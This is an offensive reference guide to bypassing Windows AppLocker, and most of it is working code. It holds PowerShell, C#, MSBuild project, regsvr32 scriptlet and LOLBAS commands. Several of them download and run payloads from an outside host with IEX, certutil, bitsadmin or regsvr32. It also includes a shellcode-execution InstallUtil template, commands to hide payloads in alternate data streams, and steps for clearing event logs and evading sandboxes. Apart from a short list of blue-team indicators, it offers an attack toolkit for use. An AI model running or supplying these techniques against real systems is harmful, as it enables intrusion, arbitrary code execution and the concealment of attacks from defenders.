# AppLocker Bypass Techniques Reference

## ELI5: The Art of Rule Breaking

### Finding Loopholes Like a Lawyer

Imagine AppLocker rules are like a "No Pets" sign in an apartment building. Smart tenants find loopholes:
- 🐠 "Fish aren't really pets, they're decorations!"
- 🦎 "This isn't a pet, it's an emotional support iguana!"
- 🐍 "The lease says 'No Dogs or Cats' - snakes aren't mentioned!"

Similarly, we find loopholes in AppLocker:
- 📁 "You said no EXEs in Temp, but you didn't mention System32!"
- 📝 "You blocked PowerShell.exe, but what about PowerShell_ISE.exe?"
- 🔧 "You forgot about MSBuild.exe - it can run code too!"

### The Trust Exploitation Game

**AppLocker's Trust Hierarchy:**
1. **Microsoft Signed** = "The King's Seal" (Highest trust)
2. **Program Files** = "Noble's Quarter" (Trusted location)
3. **Windows Directory** = "Castle Grounds" (System trust)
4. **User Directories** = "Peasant Villages" (Usually blocked)

**Our Strategy:** Find ways to execute from trusted locations or abuse trusted binaries!

### Living Off The Land Philosophy

**Traditional Attack:**
```
Attacker → Downloads tool.exe → Executes → Gets blocked → Sad attacker
```

**Living Off The Land:**
```
Attacker → Uses cmd.exe (already there!) → Executes → Works → Happy attacker
```

**ELI5:** Why bring your own ladder to rob a house when there's already one in the garage?

## Trusted Directory Abuse

### The Windows Tasks Folder Goldmine

```powershell
# C:\Windows\Tasks - Often writable by users!
$taskPath = "C:\Windows\Tasks"

# Check permissions
icacls $taskPath

# Typical output showing BUILTIN\Users has write access:
# C:\Windows\Tasks BUILTIN\Users:(CI)(S,WD,AD,X)

# Drop payload here
Copy-Item "C:\temp\payload.exe" "C:\Windows\Tasks\legitupdate.exe"

# Execute from trusted location
Start-Process "C:\Windows\Tasks\legitupdate.exe"
```

### Windows Temp Directory Exploitation

```powershell
# Multiple temp locations often overlooked
$tempPaths = @(
    "C:\Windows\Temp",
    "C:\Windows\System32\Tasks",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "C:\Windows\System32\spool\PRINTERS",
    "C:\Windows\System32\spool\SERVERS",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Windows\SysWOW64\Temp",
    "C:\Windows\tracing",
    "C:\Windows\Registration\CRMLog",
    "C:\Windows\System32\FxsTmp",
    "C:\Windows\System32\com\dmp",
    "C:\Windows\Debug\WIA"
)

# Find writable directories
foreach ($path in $tempPaths) {
    if (Test-Path $path) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        $writeAccess = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write" -and
            $_.IdentityReference -match "Users"
        }
        if ($writeAccess) {
            Write-Host "[+] Writable: $path" -ForegroundColor Green
        }
    }
}
```

### Subdirectory Creation Bypass

```powershell
# Even if parent is blocked, subdirectories might not be!
# Find directories where we can create subdirectories
$programFiles = "${env:ProgramFiles}"

# Test subdirectory creation
$testDirs = Get-ChildItem $programFiles -Directory | Select -First 10

foreach ($dir in $testDirs) {
    try {
        $testPath = Join-Path $dir.FullName "testdir"
        New-Item -Path $testPath -ItemType Directory -ErrorAction Stop | Out-Null
        Write-Host "[+] Can create in: $($dir.FullName)" -ForegroundColor Green
        Remove-Item $testPath -Force
    } catch {
        # Can't create here
    }
}
```

## Alternate Data Streams (ADS) Techniques

### Understanding ADS for Bypasses

```powershell
# ADS allows hiding data in alternate streams of files
# AppLocker often misses these!

# Method 1: Hide executable in ADS
$targetFile = "C:\Windows\System32\notepad.exe"
$payload = Get-Content "C:\temp\payload.exe" -Encoding Byte

# Write payload to ADS
Set-Content -Path "${targetFile}:hidden.exe" -Value $payload -Encoding Byte

# Execute from ADS using WMIC
wmic process call create "C:\Windows\System32\notepad.exe:hidden.exe"

# Method 2: Hide script in ADS
$script = @'
Write-Host "Executed from ADS!"
Start-Process calc.exe
'@

# Write PowerShell to ADS
Set-Content -Path "${targetFile}:script.ps1" -Value $script

# Execute PowerShell from ADS
powershell -command "Get-Content -Path 'C:\Windows\System32\notepad.exe:script.ps1' | Invoke-Expression"
```

### ADS with JavaScript/VBScript

```javascript
// Save as test.js:stream
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");

// Execute with:
// wscript C:\Windows\System32\notepad.exe:test.js
```

```vbscript
' Save as test.vbs:stream
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc.exe"

' Execute with:
' cscript C:\Windows\System32\notepad.exe:test.vbs
```

## PowerShell Constraint Language Mode Bypasses

### Custom Runspace Creation

```powershell
# When PowerShell is in Constrained Language Mode
# Create unrestricted runspace

$code = @'
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Bypass
{
    public static void Execute()
    {
        // Create initial session state
        InitialSessionState iss = InitialSessionState.CreateDefault();
        iss.LanguageMode = PSLanguageMode.FullLanguage;

        // Create runspace
        Runspace runspace = RunspaceFactory.CreateRunspace(iss);
        runspace.Open();

        // Create pipeline
        Pipeline pipeline = runspace.CreatePipeline();
        pipeline.Commands.AddScript(@"
            Write-Host 'Unrestricted PowerShell!'
            IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')
        ");

        // Execute
        pipeline.Invoke();
        runspace.Close();
    }
}
'@

# Compile and execute
Add-Type -TypeDefinition $code -Language CSharp
[Bypass]::Execute()
```

### PowerShell Version Downgrade

```powershell
# AppLocker rules often miss PowerShell v2
# Downgrade to v2 (if available)
powershell.exe -version 2 -command "Write-Host 'PSv2 Bypass!'"

# Check if v2 is available
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# If not installed (but you have admin)
Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

### COM Object Instantiation

```powershell
# Using COM objects to bypass CLM
$com = New-Object -ComObject MSScriptControl.ScriptControl
$com.Language = 'JScript'
$com.AddCode(@'
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");
'@)
```

## Script Host Bypasses

### MSBuild.exe Abuse

```xml
<!-- Save as bypass.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Bypass">
    <ClassExample />
  </Target>

  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Reference Include="System.Management.Automation" />
      <Using Namespace="System" />
      <Using Namespace="System.Reflection" />
      <Using Namespace="System.Diagnostics" />
      <Using Namespace="System.Management.Automation" />
      <Using Namespace="System.Management.Automation.Runspaces" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Diagnostics;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task, ITask
        {
            public override bool Execute()
            {
                // Method 1: Direct process execution
                Process.Start("calc.exe");

                // Method 2: PowerShell execution
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.AddScript("Write-Host 'MSBuild Bypass Success!'");
                    ps.Invoke();
                }

                // Method 3: Download and execute
                string cmd = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')";

                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                Pipeline pipeline = runspace.CreatePipeline();
                pipeline.Commands.AddScript(cmd);
                pipeline.Invoke();
                runspace.Close();

                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```powershell
# Execute with MSBuild (usually whitelisted)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj

# 64-bit version
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe bypass.csproj
```

### InstallUtil.exe Bypass

```csharp
// Save as Bypass.cs and compile: csc.exe /target:library Bypass.cs
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace Bypass
{
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c calc.exe";
            Process.Start(psi);

            // Or shellcode execution
            byte[] shellcode = new byte[] { /* msfvenom shellcode */ };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
}
```

```powershell
# Execute with InstallUtil
C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe /U Bypass.dll
```

### Regsvr32.exe with Scriptlets

```xml
<!-- Save as bypass.sct -->
<?XML version="1.0"?>
<scriptlet>
<registration
    description="Bypass"
    progid="Bypass"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
    >
</registration>

<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```

```powershell
# Execute with regsvr32 (proxy aware!)
regsvr32.exe /s /n /u /i:http://10.10.10.10/bypass.sct scrobj.dll

# Local file
regsvr32.exe /s /n /u /i:file://C:/temp/bypass.sct scrobj.dll
```

## DLL Side-Loading and Search Order Hijacking

### DLL Search Order Exploitation

```powershell
# Windows DLL search order:
# 1. Application directory
# 2. System directory (System32)
# 3. 16-bit system directory (System)
# 4. Windows directory
# 5. Current directory
# 6. PATH directories

# Find hijackable DLLs
$procmon = "Download Process Monitor"
# Filter: Process Name is target.exe
# Filter: Operation is CreateFile
# Filter: Result is NAME NOT FOUND
# Filter: Path ends with .dll

# Common hijackable DLLs
$targets = @(
    "VERSION.dll",
    "WINHTTP.dll",
    "MSASN1.dll",
    "NETAPI32.dll",
    "SAMCLI.dll"
)

# Generate proxy DLL that forwards calls
# Tool: https://github.com/Flangvik/SharpDllProxy
```

### Phantom DLL Technique

```csharp
// Create DLL that legitimate apps try to load
// Save as version.dll
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PhantomDLL
{
    public class Loader
    {
        [DllExport("DllMain", CallingConvention = CallingConvention.StdCall)]
        public static bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved)
        {
            if (fdwReason == 1) // DLL_PROCESS_ATTACH
            {
                Process.Start("calc.exe");
            }
            return true;
        }
    }
}
```

## Living Off The Land Binaries (LOLBAS)

### Comprehensive LOLBAS Execution Matrix

```powershell
# LOLBAS execution techniques that bypass AppLocker

# 1. Rundll32.exe - Swiss Army Knife
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe");

# 2. Certutil.exe - Download and decode
certutil.exe -urlcache -f http://10.10.10.10/payload.exe payload.exe
certutil.exe -decode payload.b64 payload.exe

# 3. Bitsadmin.exe - Background transfer
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10/payload.exe C:\temp\payload.exe

# 4. Mshta.exe - HTML Application host
mshta.exe javascript:document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -enc <base64>");

# 5. Cmstp.exe - Connection Manager Profile
cmstp.exe /ni /s bypass.inf

# 6. Regsvcs.exe/Regasm.exe - .NET Services
regsvcs.exe payload.dll
regasm.exe /U payload.dll

# 7. Odbcconf.exe - ODBC configuration
odbcconf.exe /S /A {REGSVR "C:\temp\payload.dll"}

# 8. Pcalua.exe - Program Compatibility Assistant
pcalua.exe -a C:\temp\payload.exe

# 9. Forfiles.exe - Batch processing
forfiles /p c:\windows\system32 /m calc.exe /c "cmd /c @file"

# 10. SyncAppvPublishingServer.exe - PowerShell execution
SyncAppvPublishingServer.exe "n;Start-Process calc"
```

### Advanced LOLBAS Chaining

```powershell
# Chain multiple LOLBAS for defense evasion

# Step 1: Download with certutil
$b64 = "certutil -urlcache -f http://10.10.10.10/stage1.b64 %TEMP%\s1.txt"

# Step 2: Decode with certutil
$decode = "certutil -decode %TEMP%\s1.txt %TEMP%\s1.dll"

# Step 3: Execute with rundll32
$exec = "rundll32 %TEMP%\s1.dll,DllMain"

# Chain execution
cmd /c "$b64 & $decode & $exec"
```

## Advanced Bypass Techniques

### CLM Bypass via .NET Deserialization

```csharp
// Generate serialized object that bypasses CLM
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

[Serializable]
public class Bypass
{
    public static void Serialize()
    {
        // Create payload that deserializes to code execution
        BinaryFormatter formatter = new BinaryFormatter();
        using (MemoryStream stream = new MemoryStream())
        {
            formatter.Serialize(stream, new Gadget());
            byte[] payload = stream.ToArray();
            File.WriteAllBytes("payload.bin", payload);
        }
    }
}
```

### AppLocker Rule Manipulation (Requires Admin)

```powershell
# If you have admin but AppLocker is still enforced
# Modify rules temporarily

# Export current policy
$policy = Get-AppLockerPolicy -Effective -Xml

# Add exception for our path
$newRule = @"
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="bypass-rule" Name="Temp Bypass" Description="Temp"
                  UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePathCondition Path="C:\Evil\*"/>
      </Conditions>
    </FilePathRule>
  </RuleCollection>
</AppLockerPolicy>
"@

# Apply new policy (requires elevation)
Set-AppLockerPolicy -XmlPolicy $newRule -Merge

# Execute payload
Start-Process "C:\Evil\payload.exe"

# Restore original
Set-AppLockerPolicy -XmlPolicy $policy
```

### COM Hijacking for Persistence

```powershell
# Hijack COM objects that AppLocker trusts

# Find COM objects loaded by trusted processes
Get-ChildItem -Path "HKLM:\Software\Classes\CLSID" | ForEach-Object {
    $clsid = $_.PSChildName
    $inproc = Get-ItemProperty -Path "HKLM:\Software\Classes\CLSID\$clsid\InprocServer32" -ErrorAction SilentlyContinue
    if ($inproc) {
        # Check if DLL is missing (hijackable)
        if (-not (Test-Path $inproc.'(default)')) {
            Write-Host "Hijackable: $clsid -> $($inproc.'(default)')"
        }
    }
}

# Create malicious DLL at expected path
# When trusted process loads COM object, our code executes
```

## Real-World Bypass Scenarios

### Scenario 1: The Developer Workstation

```powershell
# Context: Dev has Visual Studio installed
# AppLocker allows anything from VS directories

# Find VS installation
$vsPath = "${env:ProgramFiles(x86)}\Microsoft Visual Studio"
$vsTools = Get-ChildItem -Path $vsPath -Recurse -Filter "*.exe" |
           Where-Object { $_.Name -match "msbuild|csc|vbc" }

# Use VS tools for execution
# MSBuild is particularly useful
$msbuild = $vsTools | Where-Object { $_.Name -eq "MSBuild.exe" } | Select -First 1

# Execute our payload via MSBuild
& $msbuild.FullName "\\attacker\share\payload.csproj"
```

### Scenario 2: The Locked-Down Kiosk

```powershell
# Context: Heavily restricted, only browser allowed
# But browser can open file:// URLs

# Step 1: Create HTA file
$hta = @'
<html>
<head>
<script language="VBScript">
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe"
self.close
</script>
</head>
</html>
'@

# Step 2: Save to accessible location
[System.IO.File]::WriteAllText("$env:TEMP\breakout.hta", $hta)

# Step 3: Navigate browser to:
# file://C:/Users/Public/breakout.hta
```

### Scenario 3: The "Secure" Server

```powershell
# Context: Server with strict AppLocker
# But IIS is installed and running

# Exploit: Use IIS components
# aspnet_compiler.exe is often whitelisted

# Create ASPX shell
$aspx = @'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    Process.Start("calc.exe");
}
</script>
'@

# Compile and execute via IIS pipeline
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v /fake -p C:\temp
```

## Detection Evasion During Bypasses

### Minimize Event Log Noise

```powershell
# Check what's being logged before attacking
auditpol /get /category:*

# Clear specific event logs if you have permissions
wevtutil cl "Microsoft-Windows-AppLocker/EXE and DLL"
wevtutil cl "Microsoft-Windows-AppLocker/MSI and Script"

# Or fill logs with noise to hide real activity
1..1000 | ForEach-Object {
    # Generate benign AppLocker events
    Test-Path "C:\Windows\System32\calc.exe" | Out-Null
}
```

### Time-Based Evasion

```powershell
# Execute during high-activity periods
$hour = (Get-Date).Hour
if ($hour -ge 9 -and $hour -le 17) {
    # Business hours - more noise to hide in
    & $bypassTechnique
} else {
    # Wait for better time
    Start-Sleep -Seconds 3600
}
```

### Environmental Checks

```powershell
# Check if we're being monitored
$suspicious = $false

# Check for common monitoring tools
$monitors = @("procmon", "procexp", "wireshark", "sysmon")
$monitors | ForEach-Object {
    if (Get-Process -Name $_ -ErrorAction SilentlyContinue) {
        $suspicious = $true
    }
}

# Check for VMs (possible sandbox)
$vmIndicators = @("VirtualBox", "VMware", "QEMU", "Xen")
$vmIndicators | ForEach-Object {
    if (Get-WmiObject Win32_ComputerSystem | Where-Object { $_.Model -match $_ }) {
        $suspicious = $true
    }
}

if (-not $suspicious) {
    # Execute bypass
}
```

## OPSEC Considerations

### Red Team Best Practices

1. **Reconnaissance First**: Always enumerate AppLocker policy before attempting bypasses
2. **Use Native Tools**: Prefer LOLBAS over custom tools
3. **Test Locally**: Validate bypasses in lab before operation
4. **Document Everything**: Note which bypasses work for future operations
5. **Clean Up**: Remove artifacts after successful bypass

### Blue Team Detection Points

**Key Indicators:**
- Execution from unusual directories
- Renamed system binaries
- Unusual parent-child process relationships
- Network connections from typically local-only binaries
- Registry modifications to AppLocker policies
- Event ID 8003 (blocked attempts) followed by successful execution

## Comprehensive Testing Checklist

```powershell
# AppLocker Bypass Testing Framework

$techniques = @{
    "Trusted Directory" = {
        Copy-Item "payload.exe" "C:\Windows\Tasks\update.exe"
        Start-Process "C:\Windows\Tasks\update.exe"
    }
    "MSBuild" = {
        & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe" "payload.csproj"
    }
    "InstallUtil" = {
        & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe" "/U" "payload.dll"
    }
    "Rundll32" = {
        rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();
    }
    "WMIC" = {
        wmic process call create "calc.exe"
    }
}

foreach ($technique in $techniques.Keys) {
    Write-Host "Testing: $technique" -ForegroundColor Yellow
    try {
        & $techniques[$technique]
        Write-Host "[+] Success" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed" -ForegroundColor Red
    }
}
```

## Conclusion

AppLocker bypasses are about creativity and understanding Windows internals. The key is not memorizing every bypass, but understanding WHY they work:

1. **Trust relationships** can be exploited
2. **Default rules** have gaps
3. **Living off the land** avoids most controls
4. **Legacy compatibility** creates opportunities
5. **Complexity** leads to misconfigurations

Remember: Every environment is different. What works in one may not work in another. Always enumerate, test, and adapt.

## Advanced Resources

- [LOLBAS Project](https://lolbas-project.github.io/)
- [API0cradle's Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
- [Oddvar Moe's AppLocker Case Studies](https://oddvar.moe/archive/)
- [Casey Smith's Twitter (@subtee)](https://twitter.com/subtee) - Bypass researcher